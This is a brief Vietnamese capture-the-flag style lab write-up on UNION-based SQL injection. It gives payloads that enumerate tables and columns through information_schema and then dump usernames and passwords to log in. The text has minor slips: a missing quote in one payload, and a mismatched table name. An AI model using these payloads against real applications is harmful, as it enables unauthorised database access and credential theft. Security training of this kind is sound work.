# SQL injection attack, listing the database contents on non-Oracle databases

Như thường lệ ta check xem có bao nhiêu cột và kiểu dữ liệu trong cột đó là gì, làm như những bài trước thì ta thấy có 2 cột và kiểu dữ liệu string.

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --` để xem tên các bảng trong database, tiếp theo ta tìm bảng có tên liên quan tới `Users` và tìm được bảng có tên `users_hxzojb`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134664576068231250/image.png)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = users_hxzojb'--` để liệt kê ra tên các cột trong bảng `users_avnkam`.

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134665511142174741/image.png)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT username_gielgn, password_zpilyt FROM users_hxzojb--` để hiển thị ra thông tin bên trong 2 cột của bảng `users_hxzojb`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134666106439733248/image.png)

Giờ thì đăng nhập và hoàn thành bài lab thôi.
